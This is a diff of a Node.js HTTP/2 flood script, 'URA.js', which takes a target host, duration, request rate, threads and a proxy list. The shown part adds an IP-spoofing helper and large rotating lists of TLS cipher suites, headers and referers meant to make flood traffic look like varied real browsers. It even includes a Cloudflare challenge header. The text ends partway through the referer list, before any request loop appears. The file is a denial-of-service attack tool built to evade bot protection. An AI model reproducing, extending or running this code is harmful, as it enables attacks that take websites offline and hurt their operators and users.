@@ -1,61 +1,61 @@
 const net = require("net");
- const http2 = require("http2");
- const tls = require("tls");
- const cluster = require("cluster");
- const url = require("url");
- const crypto = require("crypto");
- const fs = require("fs");
- const axios = require('axios');
- const cheerio = require('cheerio'); 
- const gradient = require("gradient-string")
+const http2 = require("http2");
+const tls = require("tls");
+const cluster = require("cluster");
+const url = require("url");
+const crypto = require("crypto");
+const fs = require("fs");
+const axios = require('axios');
+const cheerio = require('cheerio');
+const gradient = require("gradient-string")
 
- process.setMaxListeners(0);
- require("events").EventEmitter.defaultMaxListeners = 0;
- process.on('uncaughtException', function (exception) {
-  });
+process.setMaxListeners(0);
+require("events").EventEmitter.defaultMaxListeners = 0;
+process.on('uncaughtException', function (exception) {
+});
 
- if (process.argv.length < 7){console.log(gradient.vice(`node URA.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));; process.exit();}
- const headers = {};
-  function readLines(filePath) {
-     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
- }
- 
- function randomIntn(min, max) {
-     return Math.floor(Math.random() * (max - min) + min);
- }
- 
- function randomElement(elements) {
-     return elements[randomIntn(0, elements.length)];
- } 
- 
- function randstr(length) {
-   const characters =
-     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-   let result = "";
-   const charactersLength = characters.length;
-   for (let i = 0; i < length; i++) {
-     result += characters.charAt(Math.floor(Math.random() * charactersLength));
-   }
-   return result;
- }
- 
- const ip_spoof = () => {
-   const getRandomByte = () => {
-     return Math.floor(Math.random() * 255);
-   };
-   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
- };
- 
- const spoofed = ip_spoof();
- 
- const args = {
-     target: process.argv[2],
-     time: parseInt(process.argv[3]),
-     Rate: parseInt(process.argv[4]),
-     threads: parseInt(process.argv[5]),
-     proxyFile: process.argv[6]
- }
- const sig = [    
+if (process.argv.length < 7) { console.log(gradient.vice(`node URA.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));; process.exit(); }
+const headers = {};
+function readLines(filePath) {
+    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+}
+
+function randomIntn(min, max) {
+    return Math.floor(Math.random() * (max - min) + min);
+}
+
+function randomElement(elements) {
+    return elements[randomIntn(0, elements.length)];
+}
+
+function randstr(length) {
+    const characters =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+
+const ip_spoof = () => {
+    const getRandomByte = () => {
+        return Math.floor(Math.random() * 255);
+    };
+    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
+};
+
+const spoofed = ip_spoof();
+
+const args = {
+    target: process.argv[2],
+    time: parseInt(process.argv[3]),
+    Rate: parseInt(process.argv[4]),
+    threads: parseInt(process.argv[5]),
+    proxyFile: process.argv[6]
+}
+const sig = [
     'ecdsa_secp256r1_sha256',
     'ecdsa_secp384r1_sha384',
     'ecdsa_secp521r1_sha512',
@@ -65,44 +65,469 @@ const net = require("net");
     'rsa_pkcs1_sha256',
     'rsa_pkcs1_sha384',
     'rsa_pkcs1_sha512'
- ];
- const sigalgs1 = sig.join(':');
- const cplist = [
-    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
-    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
-    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
-    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
-    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
-    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
-    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
- ];
- const accept_header = [
-     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
-     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
-     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
- ]; 
- const lang_header = ["en-US,en;q=0.9"];
- 
- const encoding_header = ["gzip, deflate, br"];
- 
- const control_header = ["no-cache", "max-age=0"];
- 
- const refers = [
-     "https://www.google.com/",
-     "https://www.facebook.com/",
-     "https://www.twitter.com/",
-     "https://www.youtube.com/",
-     "https://www.linkedin.com/"
- ];
- const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
- const ciphers1 = "GREASE:" + [
-     defaultCiphers[2],
-     defaultCiphers[1],
-     defaultCiphers[0],
-     ...defaultCiphers.slice(3)
- ].join(":");
- 
- const uap = [
+];
+const sigalgs1 = sig.join(':');
+const cplist = [
+    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
+    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
+    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
+    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
+    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
+    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
+    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
+    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
+    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
+    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
+    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
+    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'
+];
+const accept_header = [
+    '*/*',
+    'image/*',
+    'image/webp,image/apng',
+    'text/html',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
+    'text/html; charset=utf-8',
+    'application/json, text/plain, */*',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    '*/*',
+    'image/*',
+    'image/webp,image/apng',
+    'text/html',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language: en-US,en;q=0.5',
+    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
+    'Connection: keep-alive',
+    'Referer: https://www.example.com',
+    'Upgrade-Insecure-Requests: 1',
+    'DNT: 1',
+    'Accept-Encoding: gzip, deflate, br',
+    'Cache-Control: max-age=0',
+    'Host: www.example.com',
+    'Origin: https://www.example.com',
+    'Content-Type: application/x-www-form-urlencoded',
+    'Content-Length: 42',
+    'Cookie: session_id=abc123; user_id=12345',
+    'If-None-Match: "686897696a7c876b7e"',
+    'X-Requested-With: XMLHttpRequest',
+    'X-Forwarded-For: 192.168.1.1',
+    'CF-Challenge: captcha-challenge-header',
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
+];
+const lang_header = [
+    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
+    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
+    "en-US,en;q=0.5", "en-US,en;q=0.9",
+    "de-CH;q=0.7",
+    "da, en-gb;q=0.8, en;q=0.7",
+    "cs;q=0.5",
+    'en-US,en;q=0.9',
+    'en-GB,en;q=0.9',
+    'en-CA,en;q=0.9',
+    'en-AU,en;q=0.9',
+    'en-NZ,en;q=0.9',
+    'en-ZA,en;q=0.9',
+    'en-IE,en;q=0.9',
+    'en-IN,en;q=0.9',
+    'ar-SA,ar;q=0.9',
+    'az-Latn-AZ,az;q=0.9',
+    'be-BY,be;q=0.9',
+    'bg-BG,bg;q=0.9',
+    'bn-IN,bn;q=0.9',
+    'ca-ES,ca;q=0.9',
+    'cs-CZ,cs;q=0.9',
+    'cy-GB,cy;q=0.9',
+    'da-DK,da;q=0.9',
+    'de-DE,de;q=0.9',
+    'el-GR,el;q=0.9',
+    'es-ES,es;q=0.9',
+    'et-EE,et;q=0.9',
+    'eu-ES,eu;q=0.9',
+    'fa-IR,fa;q=0.9',
+    'fi-FI,fi;q=0.9',
+    'fr-FR,fr;q=0.9',
+    'ga-IE,ga;q=0.9',
+    'gl-ES,gl;q=0.9',
+    'gu-IN,gu;q=0.9',
+    'he-IL,he;q=0.9',
+    'hi-IN,hi;q=0.9',
+    'hr-HR,hr;q=0.9',
+    'hu-HU,hu;q=0.9',
+    'hy-AM,hy;q=0.9',
+    'id-ID,id;q=0.9',
+    'is-IS,is;q=0.9',
+    'it-IT,it;q=0.9',
+    'ja-JP,ja;q=0.9',
+    'ka-GE,ka;q=0.9',
+    'kk-KZ,kk;q=0.9',
+    'km-KH,km;q=0.9',
+    'kn-IN,kn;q=0.9',
+    'ko-KR,ko;q=0.9',
+    'ky-KG,ky;q=0.9',
+    'lo-LA,lo;q=0.9',
+    'lt-LT,lt;q=0.9',
+    'lv-LV,lv;q=0.9',
+    'mk-MK,mk;q=0.9',
+    'ml-IN,ml;q=0.9',
+    'mn-MN,mn;q=0.9',
+    'mr-IN,mr;q=0.9',
+    'ms-MY,ms;q=0.9',
+    'mt-MT,mt;q=0.9',
+    'my-MM,my;q=0.9',
+    'nb-NO,nb;q=0.9',
+    'ne-NP,ne;q=0.9',
+    'nl-NL,nl;q=0.9',
+    'nn-NO,nn;q=0.9',
+    'or-IN,or;q=0.9',
+    'pa-IN,pa;q=0.9',
+    'pl-PL,pl;q=0.9',
+    'pt-BR,pt;q=0.9',
+    'pt-PT,pt;q=0.9',
+    'ro-RO,ro;q=0.9',
+    'ru-RU,ru;q=0.9',
+    'si-LK,si;q=0.9',
+    'sk-SK,sk;q=0.9',
+    'sl-SI,sl;q=0.9',
+    'sq-AL,sq;q=0.9',
+    'sr-Cyrl-RS,sr;q=0.9',
+    'sr-Latn-RS,sr;q=0.9',
+    'sv-SE,sv;q=0.9',
+    'sw-KE,sw;q=0.9',
+    'ta-IN,ta;q=0.9',
+    'te-IN,te;q=0.9',
+    'th-TH,th;q=0.9',
+    'tr-TR,tr;q=0.9',
+    'uk-UA,uk;q=0.9',
+    'ur-PK,ur;q=0.9'];
+
+const encoding_header = [
+    'gzip',
+    'gzip, deflate, br',
+    'compress, gzip',
+    'deflate, gzip',
+    'gzip, identity',
+    'gzip, deflate',
+    'br',
+    'br;q=1.0, gzip;q=0.8, *;q=0.1',
+    'gzip;q=1.0, identity; q=0.5, *;q=0',
+    'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
+    'compress;q=0.5, gzip;q=1.0',
+    'identity',
+    'gzip, compress',
+    'compress, deflate',
+    'compress',
+    'gzip, deflate, br',
+    'deflate',
+    'gzip, deflate, lzma, sdch',
+    'deflate',
+];
+
+const control_header = [
+    'max-age=604800',
+    'proxy-revalidate',
+    'public, max-age=0',
+    'max-age=315360000',
+    'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
+    's-maxage=604800',
+    'max-stale',
+    'public, immutable, max-age=31536000',
+    'must-revalidate',
+    'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
+    'max-age=31536000,public,immutable',
+    'max-age=31536000,public',
+    'min-fresh',
+    'private',
+    'public',
+    's-maxage',
+    'no-cache',
+    'no-cache, no-transform',
+    'max-age=2592000',
+    'no-store',
+    'no-transform',
+    'max-age=31557600',
+    'stale-if-error',
+    'only-if-cached',
+    'max-age=0',
+    'must-understand, no-store',
+    'max-age=31536000; includeSubDomains',
+    'max-age=31536000; includeSubDomains; preload',
+    'max-age=120',
+    'max-age=0,no-cache,no-store,must-revalidate',
+    'public, max-age=604800, immutable',
+    'max-age=0, must-revalidate, private',
+    'max-age=0, private, must-revalidate',
+    'max-age=604800, stale-while-revalidate=86400',
+    'max-stale=3600',
+    'public, max-age=2678400',
+    'min-fresh=600',
+    'public, max-age=30672000',
+    'max-age=31536000, immutable',
+    'max-age=604800, stale-if-error=86400',
+    'public, max-age=604800',
+    'no-cache, no-store,private, max-age=0, must-revalidate',
+    'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
+    'public, s-maxage=600, max-age=60'
+];
+
+const refers = [
+    'https://www.google.com',
+    'https://www.facebook.com',
+    'https://www.twitter.com',
+    'https://www.youtube.com',
+    'https://www.amazon.com',
+    'https://www.netflix.com',
+    'https://www.instagram.com',
+    'https://www.yahoo.com',
+    'https://www.stackoverflow.com',
+    'https://www.github.com',
+    'https://www.linkedin.com',
+    'https://www.cnn.com',
+    'https://www.apple.com',
+    'https://www.microsoft.com',
+    'https://www.wikipedia.org',
+    'https://www.nytimes.com',
+    'https://www.msn.com',
+    'https://www.reddit.com',
+    'https://www.quora.com',
+    'https://www.npr.org',
+    'https://www.bbc.com',
+    'https://www.theguardian.com',
+    'https://www.huffingtonpost.com',
+    'https://www.washingtonpost.com',
+    'https://www.wsj.com',
+    'https://www.bloomberg.com',
+    'https://www.cnbc.com',
+    'https://www.merriam-webster.com',
+    'https://www.dictionary.com',
+    'https://www.thedailybeast.com',
+    'https://www.thedailyshow.com',
+    'https://www.colbertnation.com',
+    'https://www.nationalgeographic.com',
+    'https://www.nasa.gov',
+    'https://www.nypl.org',
+    'https://www.britannica.com',
+    'https://www.healthline.com',
+    'https://www.webmd.com',
+    'https://www.mayoclinic.org',
+    'https://www.cdc.gov',
+    'https://www.nih.gov',
+    'https://www.medlineplus.gov',
+    'https://www.cancer.gov',
+    'https://www.fda.gov',
+    'https://www.nature.com',
+    'https://www.sciencemag.org',
+    'https://www.scientificamerican.com',
+    'https://www.who.int',
+    'https://www.un.org',
+    'https://www.worldbank.org',
+    'https://www.imf.org',
+    'https://www.wto.org',
+    'https://www.oecd.org',
+    'https://www.europa.eu',
+    'https://www.nato.int',
+    'https://www.icrc.org',
+    'https://www.amnesty.org',
+    'https://www.hrw.org',
+    'https://www.greenpeace.org',
+    'https://www.oxfam.org',
+    'https://www.doctorswithoutborders.org',
+    'https://www.unicef.org',
+    'https://www.savethechildren.org',
+    'https://www.redcross.org',
+    'https://www.wikipedia.org',
+    'https://www.wikimedia.org',
+    'https://www.mozilla.org',
+    'https://www.apache.org',
+    'https://www.mysql.com',
+    'https://www.php.net',
+    'https://www.python.org',
+    'https://www.ruby-lang.org',
+    'https://www.jquery.com',
+    'https://www.reactjs.org',
+    'https://www.angularjs.org',
+    'https://www.vuejs.org',
+    'https://www.bootstrap.com',
+    'https://www.materializecss.com',
+    'https://www.sass-lang.com',
+    'https://www.lesscss.org',
+    'https://www.d3js.org',
+    'https://www.highcharts.com',
+    'https://www.chartjs.org',
